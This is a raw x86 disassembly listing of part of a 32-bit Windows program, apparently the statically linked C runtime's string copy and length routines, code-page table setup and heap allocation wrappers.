  425778:	mov    eax,DWORD PTR [ecx-0x4]
  42577b:	test   al,al
  42577d:	je     0x4257a2
  42577f:	test   ah,ah
  425781:	je     0x42579d
  425783:	test   eax,0xff0000
  425788:	je     0x425798
  42578a:	test   eax,0xff000000
  42578f:	je     0x425793
  425791:	jmp    0x425760
  425793:	lea    edi,[ecx-0x1]
  425796:	jmp    0x4257a5
  425798:	lea    edi,[ecx-0x2]
  42579b:	jmp    0x4257a5
  42579d:	lea    edi,[ecx-0x3]
  4257a0:	jmp    0x4257a5
  4257a2:	lea    edi,[ecx-0x4]
  4257a5:	mov    ecx,DWORD PTR [esp+0xc]
  4257a9:	test   ecx,0x3
  4257af:	je     0x4257ce
  4257b1:	mov    dl,BYTE PTR [ecx]
  4257b3:	add    ecx,0x1
  4257b6:	test   dl,dl
  4257b8:	je     0x425820
  4257ba:	mov    BYTE PTR [edi],dl
  4257bc:	add    edi,0x1
  4257bf:	test   ecx,0x3
  4257c5:	jne    0x4257b1
  4257c7:	jmp    0x4257ce
  4257c9:	mov    DWORD PTR [edi],edx
  4257cb:	add    edi,0x4
  4257ce:	mov    edx,0x7efefeff
  4257d3:	mov    eax,DWORD PTR [ecx]
  4257d5:	add    edx,eax
  4257d7:	xor    eax,0xffffffff
  4257da:	xor    eax,edx
  4257dc:	mov    edx,DWORD PTR [ecx]
  4257de:	add    ecx,0x4
  4257e1:	test   eax,0x81010100
  4257e6:	je     0x4257c9
  4257e8:	test   dl,dl
  4257ea:	je     0x425820
  4257ec:	test   dh,dh
  4257ee:	je     0x425817
  4257f0:	test   edx,0xff0000
  4257f6:	je     0x42580a
  4257f8:	test   edx,0xff000000
  4257fe:	je     0x425802
  425800:	jmp    0x4257c9
  425802:	mov    DWORD PTR [edi],edx
  425804:	mov    eax,DWORD PTR [esp+0x8]
  425808:	pop    edi
  425809:	ret    
  42580a:	mov    WORD PTR [edi],dx
  42580d:	mov    eax,DWORD PTR [esp+0x8]
  425811:	mov    BYTE PTR [edi+0x2],0x0
  425815:	pop    edi
  425816:	ret    
  425817:	mov    WORD PTR [edi],dx
  42581a:	mov    eax,DWORD PTR [esp+0x8]
  42581e:	pop    edi
  42581f:	ret    
  425820:	mov    BYTE PTR [edi],dl
  425822:	mov    eax,DWORD PTR [esp+0x8]
  425826:	pop    edi
  425827:	ret    
  425828:	int3   
  425829:	int3   
  42582a:	int3   
  42582b:	int3   
  42582c:	int3   
  42582d:	int3   
  42582e:	int3   
  42582f:	int3   
  425830:	mov    ecx,DWORD PTR [esp+0xc]
  425834:	push   edi
  425835:	test   ecx,ecx
  425837:	je     0x4258cf
  42583d:	push   esi
  42583e:	push   ebx
  42583f:	mov    ebx,ecx
  425841:	mov    esi,DWORD PTR [esp+0x14]
  425845:	test   esi,0x3
  42584b:	mov    edi,DWORD PTR [esp+0x10]
  42584f:	jne    0x42585c
  425851:	shr    ecx,0x2
  425854:	jne    0x4258df
  42585a:	jmp    0x425883
  42585c:	mov    al,BYTE PTR [esi]
  42585e:	add    esi,0x1
  425861:	mov    BYTE PTR [edi],al
  425863:	add    edi,0x1
  425866:	sub    ecx,0x1
  425869:	je     0x425896
  42586b:	test   al,al
  42586d:	je     0x42589e
  42586f:	test   esi,0x3
  425875:	jne    0x42585c
  425877:	mov    ebx,ecx
  425879:	shr    ecx,0x2
  42587c:	jne    0x4258df
  42587e:	and    ebx,0x3
  425881:	je     0x425896
  425883:	mov    al,BYTE PTR [esi]
  425885:	add    esi,0x1
  425888:	mov    BYTE PTR [edi],al
  42588a:	add    edi,0x1
  42588d:	test   al,al
  42588f:	je     0x4258c8
  425891:	sub    ebx,0x1
  425894:	jne    0x425883
  425896:	mov    eax,DWORD PTR [esp+0x10]
  42589a:	pop    ebx
  42589b:	pop    esi
  42589c:	pop    edi
  42589d:	ret    
  42589e:	test   edi,0x3
  4258a4:	je     0x4258bc
  4258a6:	mov    BYTE PTR [edi],al
  4258a8:	add    edi,0x1
  4258ab:	sub    ecx,0x1
  4258ae:	je     0x42594c
  4258b4:	test   edi,0x3
  4258ba:	jne    0x4258a6
  4258bc:	mov    ebx,ecx
  4258be:	shr    ecx,0x2
  4258c1:	jne    0x425937
  4258c3:	mov    BYTE PTR [edi],al
  4258c5:	add    edi,0x1
  4258c8:	sub    ebx,0x1
  4258cb:	jne    0x4258c3
  4258cd:	pop    ebx
  4258ce:	pop    esi
  4258cf:	mov    eax,DWORD PTR [esp+0x8]
  4258d3:	pop    edi
  4258d4:	ret    
  4258d5:	mov    DWORD PTR [edi],edx
  4258d7:	add    edi,0x4
  4258da:	sub    ecx,0x1
  4258dd:	je     0x42587e
  4258df:	mov    edx,0x7efefeff
  4258e4:	mov    eax,DWORD PTR [esi]
  4258e6:	add    edx,eax
  4258e8:	xor    eax,0xffffffff
  4258eb:	xor    eax,edx
  4258ed:	mov    edx,DWORD PTR [esi]
  4258ef:	add    esi,0x4
  4258f2:	test   eax,0x81010100
  4258f7:	je     0x4258d5
  4258f9:	test   dl,dl
  4258fb:	je     0x425929
  4258fd:	test   dh,dh
  4258ff:	je     0x42591f
  425901:	test   edx,0xff0000
  425907:	je     0x425915
  425909:	test   edx,0xff000000
  42590f:	jne    0x4258d5
  425911:	mov    DWORD PTR [edi],edx
  425913:	jmp    0x42592d
  425915:	and    edx,0xffff
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	jmp    0x42592d
  42591f:	and    edx,0xff
  425925:	mov    DWORD PTR [edi],edx
  425927:	jmp    0x42592d
  425929:	xor    edx,edx
  42592b:	mov    DWORD PTR [edi],edx
  42592d:	add    edi,0x4
  425930:	xor    eax,eax
  425932:	sub    ecx,0x1
  425935:	je     0x425943
  425937:	xor    eax,eax
  425939:	mov    DWORD PTR [edi],eax
  42593b:	add    edi,0x4
  42593e:	sub    ecx,0x1
  425941:	jne    0x425939
  425943:	and    ebx,0x3
  425946:	jne    0x4258c3
  42594c:	mov    eax,DWORD PTR [esp+0x10]
  425950:	pop    ebx
  425951:	pop    esi
  425952:	pop    edi
  425953:	ret    
  425954:	int3   
  425955:	int3   
  425956:	int3   
  425957:	int3   
  425958:	int3   
  425959:	int3   
  42595a:	int3   
  42595b:	int3   
  42595c:	int3   
  42595d:	int3   
  42595e:	int3   
  42595f:	int3   
  425960:	mov    ecx,DWORD PTR [esp+0x4]
  425964:	test   ecx,0x3
  42596a:	je     0x425990
  42596c:	mov    al,BYTE PTR [ecx]
  42596e:	add    ecx,0x1
  425971:	test   al,al
  425973:	je     0x4259c3
  425975:	test   ecx,0x3
  42597b:	jne    0x42596c
  42597d:	add    eax,0x0
  425982:	lea    esp,[esp+0x0]
  425989:	lea    esp,[esp+0x0]
  425990:	mov    eax,DWORD PTR [ecx]
  425992:	mov    edx,0x7efefeff
  425997:	add    edx,eax
  425999:	xor    eax,0xffffffff
  42599c:	xor    eax,edx
  42599e:	add    ecx,0x4
  4259a1:	test   eax,0x81010100
  4259a6:	je     0x425990
  4259a8:	mov    eax,DWORD PTR [ecx-0x4]
  4259ab:	test   al,al
  4259ad:	je     0x4259e1
  4259af:	test   ah,ah
  4259b1:	je     0x4259d7
  4259b3:	test   eax,0xff0000
  4259b8:	je     0x4259cd
  4259ba:	test   eax,0xff000000
  4259bf:	je     0x4259c3
  4259c1:	jmp    0x425990
  4259c3:	lea    eax,[ecx-0x1]
  4259c6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ca:	sub    eax,ecx
  4259cc:	ret    
  4259cd:	lea    eax,[ecx-0x2]
  4259d0:	mov    ecx,DWORD PTR [esp+0x4]
  4259d4:	sub    eax,ecx
  4259d6:	ret    
  4259d7:	lea    eax,[ecx-0x3]
  4259da:	mov    ecx,DWORD PTR [esp+0x4]
  4259de:	sub    eax,ecx
  4259e0:	ret    
  4259e1:	lea    eax,[ecx-0x4]
  4259e4:	mov    ecx,DWORD PTR [esp+0x4]
  4259e8:	sub    eax,ecx
  4259ea:	ret    
  4259eb:	push   0x8
  4259ed:	push   0x429658
  4259f2:	call   0x425350
  4259f7:	and    DWORD PTR [ebp-0x4],0x0
  4259fb:	push   0x0
  4259fd:	push   0x1
  4259ff:	call   0x427572
  425a04:	pop    ecx
  425a05:	pop    ecx
  425a06:	jmp    0x425a0f
  425a08:	xor    eax,eax
  425a0a:	inc    eax
  425a0b:	ret    
  425a0c:	mov    esp,DWORD PTR [ebp-0x18]
  425a0f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a13:	push   0x3
  425a15:	call   DWORD PTR ds:0x42905c
  425a1b:	int3   
  425a1c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a22:	jne    0x425a25
  425a24:	ret    
  425a25:	jmp    0x4259eb
  425a2a:	movzx  eax,BYTE PTR [esp+0x4]
  425a2f:	mov    cl,BYTE PTR [esp+0xc]
  425a33:	test   BYTE PTR [eax+0x45df21],cl
  425a39:	jne    0x425a57
  425a3b:	cmp    DWORD PTR [esp+0x8],0x0
  425a40:	je     0x425a50
  425a42:	movzx  eax,WORD PTR [eax*2+0x429a52]
  425a4a:	and    eax,DWORD PTR [esp+0x8]
  425a4e:	jmp    0x425a52
  425a50:	xor    eax,eax
  425a52:	test   eax,eax
  425a54:	jne    0x425a57
  425a56:	ret    
  425a57:	xor    eax,eax
  425a59:	inc    eax
  425a5a:	ret    
  425a5b:	push   0x4
  425a5d:	push   0x0
  425a5f:	push   DWORD PTR [esp+0xc]
  425a63:	call   0x425a2a
  425a68:	add    esp,0xc
  425a6b:	ret    
  425a6c:	sub    eax,0x3a4
  425a71:	je     0x425a95
  425a73:	sub    eax,0x4
  425a76:	je     0x425a8f
  425a78:	sub    eax,0xd
  425a7b:	je     0x425a89
  425a7d:	dec    eax
  425a7e:	je     0x425a83
  425a80:	xor    eax,eax
  425a82:	ret    
  425a83:	mov    eax,0x404
  425a88:	ret    
  425a89:	mov    eax,0x412
  425a8e:	ret    
  425a8f:	mov    eax,0x804
  425a94:	ret    
  425a95:	mov    eax,0x411
  425a9a:	ret    
  425a9b:	push   edi
  425a9c:	push   0x40
  425a9e:	xor    eax,eax
  425aa0:	pop    ecx
  425aa1:	mov    edi,0x45df20
  425aa6:	rep stos DWORD PTR es:[edi],eax
  425aa8:	stos   BYTE PTR es:[edi],al
  425aa9:	xor    eax,eax
  425aab:	mov    ds:0x45e024,eax
  425ab0:	mov    ds:0x45df1c,eax
  425ab5:	mov    ds:0x45df14,eax
  425aba:	mov    edi,0x45e030
  425abf:	stos   DWORD PTR es:[edi],eax
  425ac0:	stos   DWORD PTR es:[edi],eax
  425ac1:	stos   DWORD PTR es:[edi],eax
  425ac2:	pop    edi
  425ac3:	ret    
  425ac4:	push   ebp
  425ac5:	mov    ebp,esp
  425ac7:	sub    esp,0x518
  425acd:	mov    eax,ds:0x45d430
  425ad2:	xor    eax,DWORD PTR [ebp+0x4]
  425ad5:	push   esi
  425ad6:	mov    DWORD PTR [ebp-0x4],eax
  425ad9:	lea    eax,[ebp-0x18]
  425adc:	push   eax
  425add:	push   DWORD PTR ds:0x45e024
  425ae3:	call   DWORD PTR ds:0x4290c8
  425ae9:	cmp    eax,0x1
  425aec:	mov    esi,0x100
  425af1:	jne    0x425c04
  425af7:	xor    eax,eax
  425af9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425b00:	inc    eax
  425b01:	cmp    eax,esi
  425b03:	jb     0x425af9
  425b05:	mov    al,BYTE PTR [ebp-0x12]
  425b08:	test   al,al
  425b0a:	mov    BYTE PTR [ebp-0x118],0x20
  425b11:	je     0x425b49
  425b13:	push   ebx
  425b14:	lea    edx,[ebp-0x11]
  425b17:	push   edi
  425b18:	movzx  ecx,BYTE PTR [edx]
  425b1b:	movzx  eax,al
  425b1e:	cmp    eax,ecx
  425b20:	ja     0x425b3f
  425b22:	sub    ecx,eax
  425b24:	inc    ecx
  425b25:	mov    ebx,ecx
  425b27:	shr    ecx,0x2
  425b2a:	lea    edi,[ebp+eax*1-0x118]
  425b31:	mov    eax,0x20202020
  425b36:	rep stos DWORD PTR es:[edi],eax
  425b38:	mov    ecx,ebx
  425b3a:	and    ecx,0x3
  425b3d:	rep stos BYTE PTR es:[edi],al
  425b3f:	inc    edx
  425b40:	mov    al,BYTE PTR [edx]
  425b42:	inc    edx
  425b43:	test   al,al
  425b45:	jne    0x425b18
  425b47:	pop    edi
  425b48:	pop    ebx
  425b49:	push   0x0
  425b4b:	push   DWORD PTR ds:0x45df14
  425b51:	lea    eax,[ebp-0x518]
  425b57:	push   DWORD PTR ds:0x45e024
  425b5d:	push   eax
  425b5e:	push   esi
  425b5f:	lea    eax,[ebp-0x118]
  425b65:	push   eax
  425b66:	push   0x1
  425b68:	call   0x427a78
  425b6d:	push   0x0
  425b6f:	push   DWORD PTR ds:0x45e024
  425b75:	lea    eax,[ebp-0x218]
  425b7b:	push   esi
  425b7c:	push   eax
  425b7d:	push   esi
  425b7e:	lea    eax,[ebp-0x118]
  425b84:	push   eax
  425b85:	push   esi
  425b86:	push   DWORD PTR ds:0x45df14
  425b8c:	call   0x4276bc
  425b91:	push   0x0
  425b93:	push   DWORD PTR ds:0x45e024
  425b99:	lea    eax,[ebp-0x318]
  425b9f:	push   esi
  425ba0:	push   eax
  425ba1:	push   esi
  425ba2:	lea    eax,[ebp-0x118]
  425ba8:	push   eax
  425ba9:	push   0x200
  425bae:	push   DWORD PTR ds:0x45df14
  425bb4:	call   0x4276bc
  425bb9:	add    esp,0x5c
  425bbc:	xor    eax,eax
  425bbe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bc6:	test   cl,0x1
  425bc9:	je     0x425be1
  425bcb:	or     BYTE PTR [eax+0x45df21],0x10
  425bd2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bd9:	mov    BYTE PTR [eax+0x45e040],cl
  425bdf:	jmp    0x425bfd
  425be1:	test   cl,0x2
  425be4:	je     0x425bf6
  425be6:	or     BYTE PTR [eax+0x45df21],0x20
  425bed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425bf4:	jmp    0x425bd9
  425bf6:	and    BYTE PTR [eax+0x45e040],0x0
  425bfd:	inc    eax
  425bfe:	cmp    eax,esi
  425c00:	jb     0x425bbe
  425c02:	jmp    0x425c48
  425c04:	xor    eax,eax
  425c06:	cmp    eax,0x41
  425c09:	jb     0x425c24
  425c0b:	cmp    eax,0x5a
  425c0e:	ja     0x425c24
  425c10:	or     BYTE PTR [eax+0x45df21],0x10
  425c17:	mov    cl,al
  425c19:	add    cl,0x20
  425c1c:	mov    BYTE PTR [eax+0x45e040],cl
  425c22:	jmp    0x425c43
  425c24:	cmp    eax,0x61
  425c27:	jb     0x425c3c
  425c29:	cmp    eax,0x7a
  425c2c:	ja     0x425c3c
  425c2e:	or     BYTE PTR [eax+0x45df21],0x20
  425c35:	mov    cl,al
  425c37:	sub    cl,0x20
  425c3a:	jmp    0x425c1c
  425c3c:	and    BYTE PTR [eax+0x45e040],0x0
  425c43:	inc    eax
  425c44:	cmp    eax,esi
  425c46:	jb     0x425c06
  425c48:	mov    ecx,DWORD PTR [ebp-0x4]
  425c4b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c4e:	pop    esi
  425c4f:	call   0x425a1c
  425c54:	leave  
  425c55:	ret    
  425c56:	push   ebp
  425c57:	mov    ebp,esp
  425c59:	sub    esp,0x1c
  425c5c:	mov    eax,ds:0x45d430
  425c61:	xor    eax,DWORD PTR [ebp+0x4]
  425c64:	push   ebx
  425c65:	push   esi
  425c66:	mov    esi,DWORD PTR [ebp+0x8]
  425c69:	xor    ebx,ebx
  425c6b:	cmp    esi,ebx
  425c6d:	mov    DWORD PTR [ebp-0x4],eax
  425c70:	push   edi
  425c71:	je     0x425dcb
  425c77:	xor    edx,edx
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c81:	je     0x425ce8
  425c83:	add    eax,0x30
  425c86:	inc    edx
  425c87:	cmp    eax,0xf0
  425c8c:	jb     0x425c7b
  425c8e:	lea    eax,[ebp-0x1c]
  425c91:	push   eax
  425c92:	push   esi
  425c93:	call   DWORD PTR ds:0x4290c8
  425c99:	cmp    eax,0x1
  425c9c:	jne    0x425dc3
  425ca2:	push   0x40
  425ca4:	xor    eax,eax
  425ca6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425caa:	pop    ecx
  425cab:	mov    edi,0x45df20
  425cb0:	rep stos DWORD PTR es:[edi],eax
  425cb2:	stos   BYTE PTR es:[edi],al
  425cb3:	mov    DWORD PTR ds:0x45e024,esi
  425cb9:	mov    DWORD PTR ds:0x45df14,ebx
  425cbf:	jbe    0x425db1
  425cc5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cc9:	je     0x425d89
  425ccf:	lea    ecx,[ebp-0x15]
  425cd2:	mov    dl,BYTE PTR [ecx]
  425cd4:	test   dl,dl
  425cd6:	je     0x425d89
  425cdc:	movzx  eax,BYTE PTR [ecx-0x1]
  425ce0:	movzx  edx,dl
  425ce3:	jmp    0x425d79
  425ce8:	push   0x40
  425cea:	xor    eax,eax
  425cec:	pop    ecx
  425ced:	mov    edi,0x45df20
  425cf2:	rep stos DWORD PTR es:[edi],eax
  425cf4:	lea    ecx,[edx+edx*2]
  425cf7:	shl    ecx,0x4
  425cfa:	mov    DWORD PTR [ebp-0x8],ebx
  425cfd:	stos   BYTE PTR es:[edi],al
  425cfe:	lea    ebx,[ecx+0x45d450]
  425d04:	mov    al,BYTE PTR [ebx]
  425d06:	mov    esi,ebx
  425d08:	jmp    0x425d33
  425d0a:	mov    dl,BYTE PTR [esi+0x1]
  425d0d:	test   dl,dl
  425d0f:	je     0x425d37
  425d11:	movzx  eax,al
  425d14:	movzx  edi,dl
  425d17:	cmp    eax,edi
  425d19:	ja     0x425d2f
  425d1b:	mov    edx,DWORD PTR [ebp-0x8]
  425d1e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d24:	or     BYTE PTR [eax+0x45df21],dl
  425d2a:	inc    eax
  425d2b:	cmp    eax,edi
  425d2d:	jbe    0x425d24
  425d2f:	inc    esi
  425d30:	inc    esi
  425d31:	mov    al,BYTE PTR [esi]
  425d33:	test   al,al
  425d35:	jne    0x425d0a
  425d37:	inc    DWORD PTR [ebp-0x8]
  425d3a:	add    ebx,0x8
  425d3d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d41:	jb     0x425d04
  425d43:	mov    eax,DWORD PTR [ebp+0x8]
  425d46:	mov    ds:0x45e024,eax
  425d4b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d55:	call   0x425a6c
  425d5a:	lea    ecx,[ecx+0x45d444]
  425d60:	mov    esi,ecx
  425d62:	mov    edi,0x45e030
  425d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d69:	mov    ds:0x45df14,eax
  425d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d6f:	jmp    0x425dd0
  425d71:	or     BYTE PTR [eax+0x45df21],0x4
  425d78:	inc    eax
  425d79:	cmp    eax,edx
  425d7b:	jbe    0x425d71
  425d7d:	inc    ecx
  425d7e:	inc    ecx
  425d7f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d83:	jne    0x425cd2
  425d89:	xor    ecx,ecx
  425d8b:	inc    ecx
  425d8c:	mov    eax,ecx
  425d8e:	or     BYTE PTR [eax+0x45df21],0x8
  425d95:	inc    eax
  425d96:	cmp    eax,0xff
  425d9b:	jb     0x425d8e
  425d9d:	mov    eax,esi
  425d9f:	call   0x425a6c
  425da4:	mov    ds:0x45df14,eax
  425da9:	mov    DWORD PTR ds:0x45df1c,ecx
  425daf:	jmp    0x425db7
  425db1:	mov    DWORD PTR ds:0x45df1c,ebx
  425db7:	xor    eax,eax
  425db9:	mov    edi,0x45e030
  425dbe:	stos   DWORD PTR es:[edi],eax
  425dbf:	stos   DWORD PTR es:[edi],eax
  425dc0:	stos   DWORD PTR es:[edi],eax
  425dc1:	jmp    0x425dd0
  425dc3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425dc9:	je     0x425dd9
  425dcb:	call   0x425a9b
  425dd0:	call   0x425ac4
  425dd5:	xor    eax,eax
  425dd7:	jmp    0x425ddc
  425dd9:	or     eax,0xffffffff
  425ddc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ddf:	xor    ecx,DWORD PTR [ebp+0x4]
  425de2:	pop    edi
  425de3:	pop    esi
  425de4:	pop    ebx
  425de5:	call   0x425a1c
  425dea:	leave  
  425deb:	ret    
  425dec:	push   0x14
  425dee:	push   0x429668
  425df3:	call   0x425350
  425df8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dfc:	push   0xd
  425dfe:	call   0x42550f
  425e03:	pop    ecx
  425e04:	xor    edi,edi
  425e06:	mov    DWORD PTR [ebp-0x4],edi
  425e09:	mov    DWORD PTR ds:0x45dd84,edi
  425e0f:	mov    eax,DWORD PTR [ebp+0x8]
  425e12:	cmp    eax,0xfffffffe
  425e15:	jne    0x425e29
  425e17:	mov    DWORD PTR ds:0x45dd84,0x1
  425e21:	call   DWORD PTR ds:0x4290c4
  425e27:	jmp    0x425e54
  425e29:	cmp    eax,0xfffffffd
  425e2c:	jne    0x425e40
  425e2e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e38:	call   DWORD PTR ds:0x4290c0
  425e3e:	jmp    0x425e54
  425e40:	cmp    eax,0xfffffffc
  425e43:	jne    0x425e54
  425e45:	mov    DWORD PTR ds:0x45dd84,0x1
  425e4f:	mov    eax,ds:0x45ddb4
  425e54:	mov    DWORD PTR [ebp+0x8],eax
  425e57:	cmp    eax,DWORD PTR ds:0x45e024
  425e5d:	je     0x425f1e
  425e63:	mov    esi,DWORD PTR ds:0x45df18
  425e69:	mov    DWORD PTR [ebp-0x20],esi
  425e6c:	cmp    esi,edi
  425e6e:	je     0x425e74
  425e70:	cmp    DWORD PTR [esi],edi
  425e72:	je     0x425e84
  425e74:	push   0x220
  425e79:	call   0x426072
  425e7e:	pop    ecx
  425e7f:	mov    esi,eax
  425e81:	mov    DWORD PTR [ebp-0x20],esi
  425e84:	cmp    esi,edi
  425e86:	je     0x425f07
  425e88:	push   DWORD PTR [ebp+0x8]
  425e8b:	call   0x425c56
  425e90:	pop    ecx
  425e91:	mov    DWORD PTR [ebp-0x1c],eax
  425e94:	cmp    eax,edi
  425e96:	jne    0x425f07
  425e98:	mov    DWORD PTR [esi],edi
  425e9a:	mov    eax,ds:0x45e024
  425e9f:	mov    DWORD PTR [esi+0x4],eax
  425ea2:	mov    eax,ds:0x45df1c
  425ea7:	mov    DWORD PTR [esi+0x8],eax
  425eaa:	mov    eax,ds:0x45df14
  425eaf:	mov    DWORD PTR [esi+0xc],eax
  425eb2:	xor    eax,eax
  425eb4:	mov    DWORD PTR [ebp-0x24],eax
  425eb7:	cmp    eax,0x5
  425eba:	jge    0x425ecc
  425ebc:	mov    cx,WORD PTR [eax*2+0x45e030]
  425ec4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425ec9:	inc    eax
  425eca:	jmp    0x425eb4
  425ecc:	xor    eax,eax
  425ece:	mov    DWORD PTR [ebp-0x24],eax
  425ed1:	cmp    eax,0x101
  425ed6:	jge    0x425ee5
  425ed8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ede:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ee2:	inc    eax
  425ee3:	jmp    0x425ece
  425ee5:	xor    eax,eax
  425ee7:	mov    DWORD PTR [ebp-0x24],eax
  425eea:	cmp    eax,0x100
  425eef:	jge    0x425f01
  425ef1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ef7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425efe:	inc    eax
  425eff:	jmp    0x425ee7
  425f01:	mov    DWORD PTR ds:0x45df18,esi
  425f07:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425f0b:	jne    0x425f21
  425f0d:	cmp    esi,DWORD PTR ds:0x45df18
  425f13:	je     0x425f21
  425f15:	push   esi
  425f16:	call   0x425f5a
  425f1b:	pop    ecx
  425f1c:	jmp    0x425f21
  425f1e:	mov    DWORD PTR [ebp-0x1c],edi
  425f21:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f25:	call   0x425f33
  425f2a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f2d:	call   0x42538b
  425f32:	ret    
  425f33:	push   0xd
  425f35:	call   0x42547b
  425f3a:	pop    ecx
  425f3b:	ret    
  425f3c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f43:	jne    0x425f57
  425f45:	push   0xfffffffd
  425f47:	call   0x425dec
  425f4c:	pop    ecx
  425f4d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f57:	xor    eax,eax
  425f59:	ret    
  425f5a:	push   0xc
  425f5c:	push   0x429678
  425f61:	call   0x425350
  425f66:	mov    esi,DWORD PTR [ebp+0x8]
  425f69:	test   esi,esi
  425f6b:	je     0x425fc5
  425f6d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f74:	jne    0x425fb6
  425f76:	push   0x4
  425f78:	call   0x42550f
  425f7d:	pop    ecx
  425f7e:	and    DWORD PTR [ebp-0x4],0x0
  425f82:	push   esi
  425f83:	call   0x426732
  425f88:	pop    ecx
  425f89:	mov    DWORD PTR [ebp-0x1c],eax
  425f8c:	test   eax,eax
  425f8e:	je     0x425f99
  425f90:	push   esi
  425f91:	push   eax
  425f92:	call   0x42675d
  425f97:	pop    ecx
  425f98:	pop    ecx
  425f99:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f9d:	call   0x425fad
  425fa2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425fa6:	jne    0x425fc5
  425fa8:	push   DWORD PTR [ebp+0x8]
  425fab:	jmp    0x425fb7
  425fad:	push   0x4
  425faf:	call   0x42547b
  425fb4:	pop    ecx
  425fb5:	ret    
  425fb6:	push   esi
  425fb7:	push   0x0
  425fb9:	push   DWORD PTR ds:0x45e140
  425fbf:	call   DWORD PTR ds:0x429048
  425fc5:	call   0x42538b
  425fca:	ret    
  425fcb:	push   0xc
  425fcd:	push   0x429688
  425fd2:	call   0x425350
  425fd7:	mov    esi,DWORD PTR [ebp+0x8]
  425fda:	cmp    DWORD PTR ds:0x45e144,0x3
  425fe1:	jne    0x426011
  425fe3:	cmp    esi,DWORD PTR ds:0x45df04
  425fe9:	ja     0x426011
  425feb:	push   0x4
  425fed:	call   0x42550f
  425ff2:	pop    ecx
  425ff3:	and    DWORD PTR [ebp-0x4],0x0
  425ff7:	push   esi
  425ff8:	call   0x426f11
  425ffd:	pop    ecx
  425ffe:	mov    DWORD PTR [ebp-0x1c],eax
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x42603d
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	test   eax,eax
  42600f:	jne    0x426034
  426011:	test   esi,esi
  426013:	jne    0x426016
  426015:	inc    esi
  426016:	cmp    DWORD PTR ds:0x45e144,0x1
  42601d:	je     0x426025
  42601f:	add    esi,0xf
  426022:	and    esi,0xfffffff0
  426025:	push   esi
  426026:	push   0x0
  426028:	push   DWORD PTR ds:0x45e140
  42602e:	call   DWORD PTR ds:0x429030
  426034:	call   0x42538b
  426039:	ret    
  42603a:	mov    esi,DWORD PTR [ebp+0x8]
  42603d:	push   0x4
  42603f:	call   0x42547b
  426044:	pop    ecx
  426045:	ret    
  426046:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42604b:	ja     0x42606f
  42604d:	push   DWORD PTR [esp+0x4]
  426051:	call   0x425fcb
  426056:	test   eax,eax
  426058:	pop    ecx
  426059:	jne    0x426071
  42605b:	cmp    DWORD PTR [esp+0x8],eax
  42605f:	je     0x426071
  426061:	push   DWORD PTR [esp+0x4]
  426065:	call   0x427c32
  42606a:	test   eax,eax
  42606c:	pop    ecx
  42606d:	jne    0x42604d
  42606f:	xor    eax,eax
  426071:	ret    
  426072:	push   DWORD PTR ds:0x45ddc8
  426078:	push   DWORD PTR [esp+0x8]
  42607c:	call   0x426046
  426081:	pop    ecx
  426082:	pop    ecx
  426083:	ret    
  426084:	int3   
  426085:	int3   
  426086:	int3   
  426087:	int3   
  426088:	int3   
  426089:	int3   
  42608a:	int3   
  42608b:	int3   
  42608c:	int3   
  42608d:	int3   
  42608e:	int3   
  42608f:	int3   
  426090:	push   ebp
  426091:	mov    ebp,esp
  426093:	push   edi
  426094:	push   esi
  426095:	mov    esi,DWORD PTR [ebp+0xc]
  426098:	mov    ecx,DWORD PTR [ebp+0x10]
  42609b:	mov    edi,DWORD PTR [ebp+0x8]
  42609e:	mov    eax,ecx
  4260a0:	mov    edx,ecx
  4260a2:	add    eax,esi
  4260a4:	cmp    edi,esi
  4260a6:	jbe    0x4260b0
  4260a8:	cmp    edi,eax
  4260aa:	jb     0x42622c
  4260b0:	test   edi,0x3
  4260b6:	jne    0x4260cc
  4260b8:	shr    ecx,0x2
  4260bb:	and    edx,0x3
  4260be:	cmp    ecx,0x8
  4260c1:	jb     0x4260ec
  4260c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260c5:	jmp    DWORD PTR [edx*4+0x4261dc]
  4260cc:	mov    eax,edi
  4260ce:	mov    edx,0x3
  4260d3:	sub    ecx,0x4
  4260d6:	jb     0x4260e4
  4260d8:	and    eax,0x3
  4260db:	add    ecx,eax
  4260dd:	jmp    DWORD PTR [eax*4+0x4260f0]
  4260e4:	jmp    DWORD PTR [ecx*4+0x4261ec]
  4260eb:	nop
  4260ec:	jmp    DWORD PTR [ecx*4+0x426170]
  4260f3:	nop
  4260f4:	add    BYTE PTR [ecx+0x42],ah
